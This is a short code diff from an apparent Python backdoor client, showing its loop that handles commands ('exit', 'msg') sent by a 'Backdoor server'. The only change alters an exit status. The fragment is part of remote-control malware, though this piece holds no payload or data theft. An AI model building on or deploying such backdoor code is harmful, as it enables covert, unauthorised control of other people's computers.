@@ -269,7 +269,7 @@ def main_exec():
                 # When '--x' Command Submit, Receive 'exit' from the Backdoor server
                 if strData == 'exit':
                     objSocket.close() # noqa
-                    exit(1)
+                    exit(0)
 
                 # When '--m' Command Submit, Receive 'msg' from the Backdoor server
                 elif strData[:3] == 'msg':
